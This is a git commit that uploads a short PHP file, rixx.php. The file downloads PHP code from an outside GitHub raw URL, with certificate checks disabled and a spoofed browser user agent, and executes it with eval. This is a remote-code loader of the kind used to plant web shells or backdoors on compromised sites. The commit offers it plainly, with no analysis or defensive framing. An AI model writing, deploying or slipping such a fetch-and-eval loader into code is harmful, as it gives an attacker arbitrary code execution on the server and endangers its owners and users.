a205baf227e74b044c209965f38e57fc8a014b91
wawanbangke <wawanexp51@gmail.com>
2025-07-14 09:34:38 -0700

    Add files via upload

---
+++ rixx.php
@@ -0,0 +1,22 @@
+<?php
+function getRemotePHP($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        CURLOPT_SSL_VERIFYPEER => false,
+    ]);
+
+    $code = curl_exec($ch);
+    curl_close($ch);
+
+    if (!$code) {
+        die('Gagal ambil file dari URL Cok :(.');
+    }
+
+    eval("?>$code");
+}
+
+getRemotePHP('https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/raw.php');
+?>
